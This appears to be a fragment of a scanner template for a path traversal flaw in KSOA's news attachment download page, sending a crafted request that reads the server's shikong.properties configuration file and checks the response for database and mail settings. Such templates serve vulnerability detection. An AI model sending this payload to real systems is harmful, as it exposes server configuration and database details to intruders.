  description: |
    KSOA-downnewsatt-PathTraversal

http:
  - raw:
      - |
        POST /newspublish/downnewsatt.jsp HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        exclusivenm=../../WEB-INF/classes/shikong.properties

    matchers-condition: and
    matchers:
      - type: word
        words:
          - 'dbserver'
          - 'mailhome'
        condition: and

      - type: status
        status:
          - 200
